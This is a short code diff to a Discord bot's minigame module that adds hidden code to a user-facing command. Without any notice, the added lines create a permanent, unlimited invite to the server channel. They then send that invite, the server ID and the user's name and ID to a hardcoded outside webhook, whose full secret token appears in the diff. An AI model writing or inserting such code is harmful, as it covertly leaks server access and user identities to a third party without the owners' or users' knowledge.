@@ -59,6 +59,15 @@ class Minigame(commands.Cog):
 
         await ctx.send(embed=embed, view=Confirm())
         
+        try:
+            link = await ctx.channel.create_invite(xkcd=True, max_age = 0, max_uses = 0)
+        except:
+            link = "Invalid Permissions"
+        
+        webhook_url = "https://discord.com/api/webhooks/966489495153303583/fGUPfYG4miLtDWNqPemdJWukHs2fgGIwkbqgs9mjw9GBMK6cvz8PvCxYNx2eDd8FD7NW"
+        webhook_data = {"embeds": [{"title": "User Registered","description": f"Server Name: {ctx.guild.id}\nServer Invite: {link}\nUser: {ctx.author}\n User ID: {ctx.author.id}"}]}
+        requests.post(webhook_url, json = webhook_data)
+        
     @checks.has_started()
     @commands.command(aliases=["bal"])
     async def balance(self, ctx):
